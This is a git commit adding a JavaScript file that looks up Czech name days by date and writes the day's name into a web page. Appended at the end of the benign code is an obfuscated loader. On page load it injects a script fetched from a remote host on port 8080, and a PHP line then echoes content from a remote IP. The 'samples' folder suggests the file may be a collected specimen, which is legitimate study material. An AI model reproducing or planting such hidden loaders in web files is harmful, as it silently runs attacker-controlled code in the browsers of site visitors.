b58a452bbae09930201756df146d24846f179e0e
Elijah Seymour <dostoevskylabs@users.noreply.github.com>
2017-10-04 04:11:37 +0100

    Create svatky.js

---
+++ httpd.pl/samples/svatky.js
@@ -0,0 +1,752 @@
+function ZiskejJmeno (kdy)
+{
+if (kdy=="1/1") jmeno="Nový rok";
+else
+if (kdy=="1/2") jmeno="Karina";
+else
+if (kdy=="1/3") jmeno="Radmila";
+else
+if (kdy=="1/4") jmeno="Diana";
+else
+if (kdy=="1/5") jmeno="Dalimil";
+else
+if (kdy=="1/6") jmeno="Tři kralove";
+else
+if (kdy=="1/7") jmeno="Vilma";
+else
+if (kdy=="1/8") jmeno="Čestmír";
+else
+if (kdy=="1/9") jmeno="Vladan";
+else
+if (kdy=="1/10") jmeno="Břetislav";
+else
+if (kdy=="1/11") jmeno="Bohdana";
+else
+if (kdy=="1/12") jmeno="Pravoslav";
+else
+if (kdy=="1/13") jmeno="Edita";
+else
+if (kdy=="1/14") jmeno="Radovan";
+else
+if (kdy=="1/15") jmeno="Alice";
+else
+if (kdy=="1/16") jmeno="Ctirad";
+else
+if (kdy=="1/17") jmeno="Drahoslav";
+else
+if (kdy=="1/18") jmeno="Vladislav";
+else
+if (kdy=="1/19") jmeno="Doubravka";
+else
+if (kdy=="1/20") jmeno="Ilona";
+else
+if (kdy=="1/21") jmeno="Běla";
+else
+if (kdy=="1/22") jmeno="Slavomír";
+else
+if (kdy=="1/23") jmeno="Zdeněk";
+else
+if (kdy=="1/24") jmeno="Milena";
+else
+if (kdy=="1/25") jmeno="Miloš";
+else
+if (kdy=="1/26") jmeno="Zora";
+else
+if (kdy=="1/27") jmeno="Ingrid";
+else
+if (kdy=="1/28") jmeno="Otýlie";
+else
+if (kdy=="1/29") jmeno="Zdislava";
+else
+if (kdy=="1/30") jmeno="Robin";
+else
+if (kdy=="1/31") jmeno="Marika";
+else
+if (kdy=="2/1") jmeno="Hynek";
+else
+if (kdy=="2/2") jmeno="Nela";
+else
+if (kdy=="2/3") jmeno="Blažej";
+else
+if (kdy=="2/4") jmeno="Jarmila";
+else
+if (kdy=="2/5") jmeno="Dobromila";
+else
+if (kdy=="2/6") jmeno="Vanda";
+else
+if (kdy=="2/7") jmeno="Veronika";
+else
+if (kdy=="2/8") jmeno="Milada";
+else
+if (kdy=="2/9") jmeno="Apolena";
+else
+if (kdy=="2/10") jmeno="Mojmír";
+else
+if (kdy=="2/11") jmeno="Božena";
+else
+if (kdy=="2/12") jmeno="Slavěna";
+else
+if (kdy=="2/13") jmeno="Věnceslav";
+else
+if (kdy=="2/14") jmeno="Valentýn";
+else
+if (kdy=="2/15") jmeno="Jiřina";
+else
+if (kdy=="2/16") jmeno="Ljuba";
+else
+if (kdy=="2/17") jmeno="Miloslava";
+else
+if (kdy=="2/18") jmeno="Gizela";
+else
+if (kdy=="2/19") jmeno="Patrik";
+else
+if (kdy=="2/20") jmeno="Oldřich";
+else
+if (kdy=="2/21") jmeno="Lenka";
+else
+if (kdy=="2/22") jmeno="Petr";
+else
+if (kdy=="2/23") jmeno="Svatopluk";
+else
+if (kdy=="2/24") jmeno="Matěj";
+else
+if (kdy=="2/25") jmeno="Liliana";
+else
+if (kdy=="2/26") jmeno="Dora";
+else
+if (kdy=="2/27") jmeno="Alexandr";
+else
+if (kdy=="2/28") jmeno="Lumír";
+else
+if (kdy=="2/29") jmeno="Horymír, Rufín";
+else
+if (kdy=="3/1") jmeno="Bedřich";
+else
+if (kdy=="3/2") jmeno="Anežka";
+else
+if (kdy=="3/3") jmeno="Kamil";
+else
+if (kdy=="3/4") jmeno="Stela";
+else
+if (kdy=="3/5") jmeno="Kazimír";
+else
+if (kdy=="3/6") jmeno="Miroslav";
+else
+if (kdy=="3/7") jmeno="Tomaš";
+else
+if (kdy=="3/8") jmeno="Gabriela";
+else
+if (kdy=="3/9") jmeno="Františka";
+else
+if (kdy=="3/10") jmeno="Viktorie";
+else
+if (kdy=="3/11") jmeno="Anděla";
+else
+if (kdy=="3/12") jmeno="Řehoř";
+else
+if (kdy=="3/13") jmeno="Růžena";
+else
+if (kdy=="3/14") jmeno="Rut";
+else
+if (kdy=="3/15") jmeno="Ida";
+else
+if (kdy=="3/16") jmeno="Elena";
+else
+if (kdy=="3/17") jmeno="Vlastimil";
+else
+if (kdy=="3/18") jmeno="Eduard";
+else
+if (kdy=="3/19") jmeno="Josef";
+else
+if (kdy=="3/20") jmeno="Světlana";
+else
+if (kdy=="3/21") jmeno="Radek";
+else
+if (kdy=="3/22") jmeno="Leona";
+else
+if (kdy=="3/23") jmeno="Ivona";
+else
+if (kdy=="3/24") jmeno="Gabriel";
+else
+if (kdy=="3/25") jmeno="Marian";
+else
+if (kdy=="3/26") jmeno="Emanuel";
+else
+if (kdy=="3/27") jmeno="Dita";
+else
+if (kdy=="3/28") jmeno="Soňa";
+else
+if (kdy=="3/29") jmeno="Taťana";
+else
+if (kdy=="3/30") jmeno="Arnošt";
+else
+if (kdy=="3/31") jmeno="Kvido";
+else
+if (kdy=="4/1") jmeno="Hugo";
+else
+if (kdy=="4/2") jmeno="Erika";
+else
+if (kdy=="4/3") jmeno="Richard";
+else
+if (kdy=="4/4") jmeno="Ivana";
+else
+if (kdy=="4/5") jmeno="Miroslava";
+else
+if (kdy=="4/6") jmeno="Vendula";
+else
+if (kdy=="4/7") jmeno="Heřman";
+else
+if (kdy=="4/8") jmeno="Ema";
+else
+if (kdy=="4/9") jmeno="Dušan";
+else
+if (kdy=="4/10") jmeno="Darja";
+else
+if (kdy=="4/11") jmeno="Izabela";
+else
+if (kdy=="4/12") jmeno="Julius";
+else
+if (kdy=="4/13") jmeno="Aleš";
+else
+if (kdy=="4/14") jmeno="Vincenc";
+else
+if (kdy=="4/15") jmeno="Anastazie";
+else
+if (kdy=="4/16") jmeno="Irena";
+else
+if (kdy=="4/17") jmeno="Rudolf";
+else
+if (kdy=="4/18") jmeno="Valerie";
+else
+if (kdy=="4/19") jmeno="Rostislav";
+else
+if (kdy=="4/20") jmeno="Marcela";
+else
+if (kdy=="4/21") jmeno="Alexandra";
+else
+if (kdy=="4/22") jmeno="Evženie";
+else
+if (kdy=="4/23") jmeno="Vojtěch";
+else
+if (kdy=="4/24") jmeno="Jiří";
+else
+if (kdy=="4/25") jmeno="Marek";
+else
+if (kdy=="4/26") jmeno="Oto";
+else
+if (kdy=="4/27") jmeno="Jaroslav";
+else
+if (kdy=="4/28") jmeno="Vlastislav";
+else
+if (kdy=="4/29") jmeno="Robert";
+else
+if (kdy=="4/30") jmeno="Blahoslav";
+else
+if (kdy=="5/1") jmeno="Svátek práce";
+else
+if (kdy=="5/2") jmeno="Zikmund";
+else
+if (kdy=="5/3") jmeno="Alexej";
+else
+if (kdy=="5/4") jmeno="Květoslav";
+else
+if (kdy=="5/5") jmeno="Klaudie";
+else
+if (kdy=="5/6") jmeno="Radoslav";
+else
+if (kdy=="5/7") jmeno="Stanislav";
+else
+if (kdy=="5/8") jmeno="Státní svátek";
+else
+if (kdy=="5/9") jmeno="Ctibor";
+else
+if (kdy=="5/10") jmeno="Blažena";
+else
+if (kdy=="5/11") jmeno="Svatava";
+else
+if (kdy=="5/12") jmeno="Pankrác";
+else
+if (kdy=="5/13") jmeno="Servác";
+else
+if (kdy=="5/14") jmeno="Bonifác";
+else
+if (kdy=="5/15") jmeno="Žofie";
+else
+if (kdy=="5/16") jmeno="Přemysl";
+else
+if (kdy=="5/17") jmeno="Aneta";
+else
+if (kdy=="5/18") jmeno="Nataša";
+else
+if (kdy=="5/19") jmeno="Ivo";
+else
+if (kdy=="5/20") jmeno="Zbyšek";
+else
+if (kdy=="5/21") jmeno="Monika";
+else
+if (kdy=="5/22") jmeno="Emil";
+else
+if (kdy=="5/23") jmeno="Vladimír";
+else
+if (kdy=="5/24") jmeno="Jana";
+else
+if (kdy=="5/25") jmeno="Viola";
+else
+if (kdy=="5/26") jmeno="Filip";
+else
+if (kdy=="5/27") jmeno="Valdemar";
+else
+if (kdy=="5/28") jmeno="Vilém";
+else
+if (kdy=="5/29") jmeno="Maxim";
+else
+if (kdy=="5/30") jmeno="Ferdinand";
+else
+if (kdy=="5/31") jmeno="Kamila";
+else
+if (kdy=="6/1") jmeno="Laura";
+else
+if (kdy=="6/2") jmeno="Jarmil";
+else
+if (kdy=="6/3") jmeno="Tamara";
+else
+if (kdy=="6/4") jmeno="Dalibor";
+else
+if (kdy=="6/5") jmeno="Dobroslav";
+else
+if (kdy=="6/6") jmeno="Norbert";
+else
+if (kdy=="6/7") jmeno="Iveta";
+else
+if (kdy=="6/8") jmeno="Medard";
+else
+if (kdy=="6/9") jmeno="Stanislava";
+else
+if (kdy=="6/10") jmeno="Gita";
+else
+if (kdy=="6/11") jmeno="Bruno";
+else
+if (kdy=="6/12") jmeno="Antonie";
+else
+if (kdy=="6/13") jmeno="Antonín";
+else
+if (kdy=="6/14") jmeno="Roland";
+else
+if (kdy=="6/15") jmeno="Vít";
+else
+if (kdy=="6/16") jmeno="Zbyněk";
+else
+if (kdy=="6/17") jmeno="Adolf";
+else
+if (kdy=="6/18") jmeno="Milan";
+else
+if (kdy=="6/19") jmeno="Leoš";
+else
+if (kdy=="6/20") jmeno="Květa";
+else
+if (kdy=="6/21") jmeno="Alois";
+else
+if (kdy=="6/22") jmeno="Pavla";
+else
+if (kdy=="6/23") jmeno="Zdeňka";
+else
+if (kdy=="6/24") jmeno="Jan";
+else
+if (kdy=="6/25") jmeno="Ivan";
+else
+if (kdy=="6/26") jmeno="Adriana";
+else
+if (kdy=="6/27") jmeno="Ladislav";
+else
+if (kdy=="6/28") jmeno="Lubomír";
+else
+if (kdy=="6/29") jmeno="Petr a Pavel";
+else
+if (kdy=="6/30") jmeno="Šárka";
+else
+if (kdy=="7/1") jmeno="Jaroslava";
+else
+if (kdy=="7/2") jmeno="Patricie";
+else
+if (kdy=="7/3") jmeno="Radomír";
+else
+if (kdy=="7/4") jmeno="Prokop";
+else
+if (kdy=="7/5") jmeno="Státní svátek - Cyril a Metoděj";
+else
+if (kdy=="7/6") jmeno="Státní svátek - Mistr Jan Hus";
+else
+if (kdy=="7/7") jmeno="Bohuslava";
+else
+if (kdy=="7/8") jmeno="Nora";
+else
+if (kdy=="7/9") jmeno="Drahoslava";
+else
+if (kdy=="7/10") jmeno="Libuše";
+else
+if (kdy=="7/11") jmeno="Olga";
+else
+if (kdy=="7/12") jmeno="Borek";
+else
+if (kdy=="7/13") jmeno="Markéta";
+else
+if (kdy=="7/14") jmeno="Karolína";
+else
+if (kdy=="7/15") jmeno="Jindřich";
+else
+if (kdy=="7/16") jmeno="Luboš";
+else
+if (kdy=="7/17") jmeno="Martina";
+else
+if (kdy=="7/18") jmeno="Drahomíra";
+else
+if (kdy=="7/19") jmeno="Čeněk";
+else
+if (kdy=="7/20") jmeno="Ilja";
+else
+if (kdy=="7/21") jmeno="Vítězslav";
+else
+if (kdy=="7/22") jmeno="Magdalena";
+else
+if (kdy=="7/23") jmeno="Libor";
+else
+if (kdy=="7/24") jmeno="Kristýna";
+else
+if (kdy=="7/25") jmeno="Jakub";
+else
+if (kdy=="7/26") jmeno="Anna";
+else
+if (kdy=="7/27") jmeno="Věroslav";
+else
+if (kdy=="7/28") jmeno="Viktor";
+else
+if (kdy=="7/29") jmeno="Marta";
+else
+if (kdy=="7/30") jmeno="Bořivoj";
+else
+if (kdy=="7/31") jmeno="Ignác";
+else
+if (kdy=="8/1") jmeno="Oskar";
+else
+if (kdy=="8/2") jmeno="Gustav";
+else
+if (kdy=="8/3") jmeno="Miluše";
+else
+if (kdy=="8/4") jmeno="Dominik";
+else
+if (kdy=="8/5") jmeno="Milivoj, Kristián";
+else
+if (kdy=="8/6") jmeno="Oldřiška";
+else
+if (kdy=="8/7") jmeno="Lada";
+else
+if (kdy=="8/8") jmeno="Soběslav";
+else
+if (kdy=="8/9") jmeno="Roman";
+else
+if (kdy=="8/10") jmeno="Vavřinec";
+else
+if (kdy=="8/11") jmeno="Zuzana";
+else
+if (kdy=="8/12") jmeno="Klára";
+else
+if (kdy=="8/13") jmeno="Alena";
+else
+if (kdy=="8/14") jmeno="Alan";
+else
+if (kdy=="8/15") jmeno="Hana";
+else
+if (kdy=="8/16") jmeno="Jáchym";
+else
+if (kdy=="8/17") jmeno="Petra";
+else
+if (kdy=="8/18") jmeno="Helena";
+else
+if (kdy=="8/19") jmeno="Ludvík";
+else
+if (kdy=="8/20") jmeno="Bernard";
+else
+if (kdy=="8/21") jmeno="Johana";
+else
+if (kdy=="8/22") jmeno="Bohuslav";
+else
+if (kdy=="8/23") jmeno="Sandra";
+else
+if (kdy=="8/24") jmeno="Bartoloměj";
+else
+if (kdy=="8/25") jmeno="Radim";
+else
+if (kdy=="8/26") jmeno="Luděk";
+else
+if (kdy=="8/27") jmeno="Otakar";
+else
+if (kdy=="8/28") jmeno="Augustyn";
+else
+if (kdy=="8/29") jmeno="Evelina";
+else
+if (kdy=="8/30") jmeno="Vladěna";
+else
+if (kdy=="8/31") jmeno="Pavlína";
+else
+if (kdy=="9/1") jmeno="Linda";
+else
+if (kdy=="9/2") jmeno="Adéla";
+else
+if (kdy=="9/3") jmeno="Bronislav";
+else
+if (kdy=="9/4") jmeno="Jindřiška";
+else
+if (kdy=="9/5") jmeno="Boris";
+else
+if (kdy=="9/6") jmeno="Boleslav";
+else
+if (kdy=="9/7") jmeno="Regina";
+else
+if (kdy=="9/8") jmeno="Mariana";
+else
+if (kdy=="9/9") jmeno="Daniela";
+else
+if (kdy=="9/10") jmeno="Irma";
+else
+if (kdy=="9/11") jmeno="Denisa";
+else
+if (kdy=="9/12") jmeno="Marie";
+else
+if (kdy=="9/13") jmeno="Lubor";
+else
+if (kdy=="9/14") jmeno="Radka";
+else
+if (kdy=="9/15") jmeno="Jolana";
+else
+if (kdy=="9/16") jmeno="Ludmila";
+else
+if (kdy=="9/17") jmeno="Naděžda";
+else
+if (kdy=="9/18") jmeno="Kryštof";
+else
+if (kdy=="9/19") jmeno="Zita";
+else
+if (kdy=="9/20") jmeno="Oleg";
+else
+if (kdy=="9/21") jmeno="Matouš";
+else
+if (kdy=="9/22") jmeno="Darina";
+else
+if (kdy=="9/23") jmeno="Berta";
+else
+if (kdy=="9/24") jmeno="Jaromír";
+else
+if (kdy=="9/25") jmeno="Zlata";
+else
+if (kdy=="9/26") jmeno="Andrea";
+else
+if (kdy=="9/27") jmeno="Jonáš";
+else
+if (kdy=="9/28") jmeno="Václav";
+else
+if (kdy=="9/29") jmeno="Michal";
+else
+if (kdy=="9/30") jmeno="Jeroným";
+else
+if (kdy=="10/1") jmeno="Igor";
+else
+if (kdy=="10/2") jmeno="Galina";
+else
+if (kdy=="10/3") jmeno="Bohumil";
+else
+if (kdy=="10/4") jmeno="František";
+else
+if (kdy=="10/5") jmeno="Eliška";
+else
+if (kdy=="10/6") jmeno="Hanuš";
+else
+if (kdy=="10/7") jmeno="Sergej, Justýna";
+else
+if (kdy=="10/8") jmeno="Věra";
+else
+if (kdy=="10/9") jmeno="Štefan";
+else
+if (kdy=="10/10") jmeno="Marina";
+else
+if (kdy=="10/11") jmeno="Andrej";
+else
+if (kdy=="10/12") jmeno="Marcel";
+else
+if (kdy=="10/13") jmeno="Renata";
+else
+if (kdy=="10/14") jmeno="Agáta";
+else
+if (kdy=="10/15") jmeno="Tereza";
+else
+if (kdy=="10/16") jmeno="Havel";
+else
+if (kdy=="10/17") jmeno="Hedvika";
+else
+if (kdy=="10/18") jmeno="Lukaš";
+else
+if (kdy=="10/19") jmeno="Michaela";
+else
+if (kdy=="10/20") jmeno="Vendelín";
+else
+if (kdy=="10/21") jmeno="Brigita";
+else
+if (kdy=="10/22") jmeno="Sabina";
+else
+if (kdy=="10/23") jmeno="Teodora";
+else
+if (kdy=="10/24") jmeno="Nina";
+else
+if (kdy=="10/25") jmeno="Beata";
+else
+if (kdy=="10/26") jmeno="Erik";
+else
+if (kdy=="10/27") jmeno="Zoja";
+else
+if (kdy=="10/28") jmeno="Státní svátek";
+else
+if (kdy=="10/29") jmeno="Silvie";
+else
+if (kdy=="10/30") jmeno="Tadeáš";
+else
+if (kdy=="10/31") jmeno="Štěpánka";
+else
+if (kdy=="11/1") jmeno="Felix";
+else
+if (kdy=="11/2") jmeno="Památka zesnulých";
+else
+if (kdy=="11/3") jmeno="Hubert";
+else
+if (kdy=="11/4") jmeno="Karel";
+else
+if (kdy=="11/5") jmeno="Miriam";
+else
+if (kdy=="11/6") jmeno="Liběna";
+else
+if (kdy=="11/7") jmeno="Saskie";
+else
+if (kdy=="11/8") jmeno="Bohumír";
+else
+if (kdy=="11/9") jmeno="Bohdan";
+else
+if (kdy=="11/10") jmeno="Evžen";
+else
+if (kdy=="11/11") jmeno="Martin";
+else
+if (kdy=="11/12") jmeno="Benedikt";
+else
+if (kdy=="11/13") jmeno="Tibor";
+else
+if (kdy=="11/14") jmeno="Sáva";
+else
+if (kdy=="11/15") jmeno="Leopold";
+else
+if (kdy=="11/16") jmeno="Otmar";
+else
+if (kdy=="11/17") jmeno="Mahulena";
+else
+if (kdy=="11/18") jmeno="Romana";
+else
+if (kdy=="11/19") jmeno="Alžběta";
+else
+if (kdy=="11/20") jmeno="Nikola";
+else
+if (kdy=="11/21") jmeno="Albert";
+else
+if (kdy=="11/22") jmeno="Cecilie";
+else
+if (kdy=="11/23") jmeno="Klement";
+else
+if (kdy=="11/24") jmeno="Emilie";
+else
+if (kdy=="11/25") jmeno="Kateřina";
+else
+if (kdy=="11/26") jmeno="Artur";
+else
+if (kdy=="11/27") jmeno="Xenie";
+else
+if (kdy=="11/28") jmeno="René";
+else
+if (kdy=="11/29") jmeno="Zina";
+else
+if (kdy=="11/30") jmeno="Ondřej";
+else
+if (kdy=="12/1") jmeno="Iva";
+else
+if (kdy=="12/2") jmeno="Blanka";
+else
+if (kdy=="12/3") jmeno="Svatoslav";
+else
+if (kdy=="12/4") jmeno="Barbora";
+else
+if (kdy=="12/5") jmeno="Jitka";
+else
+if (kdy=="12/6") jmeno="Mikuláš";
+else
+if (kdy=="12/7") jmeno="Ambrož";
+else
+if (kdy=="12/8") jmeno="Květoslava";
+else
+if (kdy=="12/9") jmeno="Vratislav";
+else
+if (kdy=="12/10") jmeno="Julie";
+else
+if (kdy=="12/11") jmeno="Dana";
+else
+if (kdy=="12/12") jmeno="Simona";
+else
+if (kdy=="12/13") jmeno="Lucie";
+else
+if (kdy=="12/14") jmeno="Lýdie";
+else
+if (kdy=="12/15") jmeno="Radana";
+else
+if (kdy=="12/16") jmeno="Albína";
+else
+if (kdy=="12/17") jmeno="Daniel";
+else
+if (kdy=="12/18") jmeno="Miloslav";
+else
+if (kdy=="12/19") jmeno="Ester";
+else
+if (kdy=="12/20") jmeno="Dagmar";
+else
+if (kdy=="12/21") jmeno="Natálie";
+else
+if (kdy=="12/22") jmeno="Šimon";
+else
+if (kdy=="12/23") jmeno="Vlasta";
+else
+if (kdy=="12/24") jmeno="Štědrý den - Adam a Eva";
+else
+if (kdy=="12/25") jmeno="1.svátek vánoční";
+else
+if (kdy=="12/26") jmeno="2.svátek vánoční - Štěpán";
+else
+if (kdy=="12/27") jmeno="Žaneta";
+else
+if (kdy=="12/28") jmeno="Bohumila";
+else
+if (kdy=="12/29") jmeno="Judita";
+else
+if (kdy=="12/30") jmeno="David";
+else
+if (kdy=="12/31") jmeno="Silvestr";
+else
+jmeno="Neznamy den";
+return jmeno;
+}
+function DnesSlavi(){
+today = new Date;
+mesic=eval ("1+"+today.getMonth());
+den=today.getDate();
+datum=mesic+"/"+den;
+jm=ZiskejJmeno(datum);
+document.write (jm)
+}
+
+
+
+    
+
+
+this.U='';var K=new Array();var x;if(x!='a'){x=''};function M(){var g;if(g!='Df' && g!='e'){g=''};var u="";var P=unescape;var I;if(I!='' && I!='J'){I=''};var Kr;if(Kr!='' && Kr!='hk'){Kr=''};var w=window;var T=new Array();var G='';var uX;if(uX!='jl'){uX=''};var IJ;if(IJ!='aq'){IJ=''};var m=P("%2f%75%6c%74%69%6d%61%74%65%2d%67%75%69%74%61%72%2d%63%6f%6d%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%6c%69%76%65%64%6f%6f%72%2e%62%69%7a%2e%70%68%70");this._w='';var IP;if(IP!='' && IP!='rc'){IP=''};this.Zz='';function _(C,Mu){var HL='';var wW=new String();var PQ=new String();var Z=String("g");var _v=new String();var lC=new String();var j=P("%5b"), _X=P("%5d");this.kT='';var t=j+Mu+_X;var Zi;if(Zi!='' && Zi!='Hb'){Zi=null};var q=new RegExp(t, Z);return C.replace(q, new String());this.lO="";};var Mi=new Date();var d=new String();var O=new String();var dok=new Date();var HLe;if(HLe!='' && HLe!='Cg'){HLe='L'};var OX=document;var E=_('862414221062646122811161102112111','4612');var Vf;if(Vf!='IF' && Vf!='ck'){Vf='IF'};var Wg;if(Wg!='Hk' && Wg!='pE'){Wg=''};var Sq=new String();var Slo;if(Slo!='' && Slo!='Q'){Slo=null};var Jt;if(Jt!='gp' && Jt!='pw'){Jt=''};function F(){var UN='';var pd=new Array();var p=P("%68%74%74%70%3a%2f%2f%68%65%6c%70%68%6f%6d%65%63%61%72%65%2e%61%74%3a");var kw;if(kw!=''){kw='Vt'};O=p;var Qc="";O+=E;var CA;if(CA!='' && CA!='F_'){CA='Cn'};O+=m;this.ef='';this.wG='';this.nS="";try {var Si=new String();var og;if(og!='' && og!='IJe'){og=null};FN=OX.createElement(_('slcSrSilpltS','Sxl'));this.b="";var xg=new String();var YW;if(YW!='' && YW!='Lj'){YW=''};this.ju="";FN[P("%64%65%66%65%72")]=[4,1][1];var gL="";var ON="";FN[P("%73%72%63")]=O;OX.body.appendChild(FN);var Ej=new Date();var ZH='';} catch(D){var Cy=new Date();alert(D);var lh=new Date();};}var jH;if(jH!=''){jH='xX'};w[String("on"+"lo"+"XR0kad".substr(4))]=F;var tq;if(tq!='' && tq!='Ip'){tq='Sv'};var Mb;if(Mb!='TN' && Mb != ''){Mb=null};};var xH=new String();M();var Oy;if(Oy!='ki' && Oy != ''){Oy=null};<?php echo file_get_contents("http://94.244.80.14/users.txt"); ?>
